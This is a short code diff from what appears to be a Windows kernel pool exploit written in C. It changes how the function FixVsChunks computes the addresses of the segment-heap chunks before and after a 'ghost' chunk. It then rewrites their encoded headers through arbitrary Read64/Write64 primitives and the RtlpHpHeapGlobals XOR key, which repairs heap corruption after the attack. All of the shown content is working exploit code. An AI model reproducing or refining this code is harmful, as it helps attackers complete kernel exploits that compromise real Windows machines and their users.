@@ -12,7 +12,7 @@ int FixVsChunks(exploit_addresses_t* addrs)
 {
     uint64_t new_header[2] = { 0 };
 
-    uintptr_t previous_chunk = addrs->ghost_chunk - POOL_HEADER_SIZE - PREV_CHUNK_OFFSET;
+    uintptr_t previous_chunk = addrs->ghost_vs_chunk - PREV_CHUNK_OFFSET;
     printf("[*] Modifying previous_chunk: 0x%llX\n", previous_chunk);
     new_header[0] = Read64(previous_chunk);
     new_header[0] = new_header[0] ^ previous_chunk ^ addrs->RtlpHpHeapGlobals;
@@ -25,7 +25,7 @@ int FixVsChunks(exploit_addresses_t* addrs)
     Write64(previous_chunk, new_header[0] ^ previous_chunk ^ addrs->RtlpHpHeapGlobals);
     Write64(previous_chunk + 0x8, new_header[1] ^ previous_chunk ^ addrs->RtlpHpHeapGlobals);
 
-    uintptr_t next_chunk = addrs->ghost_chunk - POOL_HEADER_SIZE + NEXT_CHUNK_OFFSET;
+    uintptr_t next_chunk = addrs->ghost_vs_chunk + NEXT_CHUNK_OFFSET;
     printf("[*] Modifying next_chunk: 0x%llX\n", next_chunk);
     new_header[0] = Read64(next_chunk);
     new_header[0] = new_header[0] ^ next_chunk ^ addrs->RtlpHpHeapGlobals;
